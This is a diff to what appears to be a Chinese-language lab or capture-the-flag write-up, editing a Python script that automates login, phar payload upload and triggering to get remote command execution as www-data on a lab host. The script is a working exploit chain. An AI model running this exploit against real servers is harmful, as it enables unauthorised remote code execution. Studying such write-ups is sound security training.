@@ -425,7 +425,6 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data) not reasonable
 为了后面枚举方便，可以写一个简单的 RCE 调用器，自动完成：登录、提交 payload、repair、phar 触发。
 
 ```python
-#!/usr/bin/env python3
 import html
 import os
 import re
@@ -434,10 +433,12 @@ import sys
 import urllib.parse
 import urllib.request
 
+
 BASE = "http://192.168.56.109/"
 ROOT = os.path.dirname(os.path.abspath(__file__))
-MAKER = os.path.join(ROOT, "make_phar_payload.php")
-OUT = os.path.join(ROOT, "rce_payload.bin")
+MAKER = os.path.join(ROOT, "__tmp_make_phar_payload.php")
+OUT = os.path.join(ROOT, "baji_rce_payload.bin")
+
 
 class Session:
     def __init__(self):
@@ -462,6 +463,7 @@ class Session:
                 self.cookie = value.split(";", 1)[0]
             return exc.read().decode("utf-8", "replace")
 
+
 def make_payload(cmd):
     subprocess.run(
         ["php", "-d", "phar.readonly=0", MAKER, "system", cmd, OUT],
@@ -470,6 +472,7 @@ def make_payload(cmd):
     )
     with open(OUT + ".txt", "r", encoding="ascii") as f:
         return f.read()
+
 
 def run_cmd(cmd):
     sess = Session()
@@ -486,7 +489,11 @@ def run_cmd(cmd):
     resp = sess.request(BASE + "?c=Files&m=read", {"file": path})
     return html.unescape(resp).replace("not reasonable", "").strip()
 
+
 if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print(f"usage: {sys.argv[0]} <command>", file=sys.stderr)
+        sys.exit(2)
     print(run_cmd(" ".join(sys.argv[1:])))
 ```
 
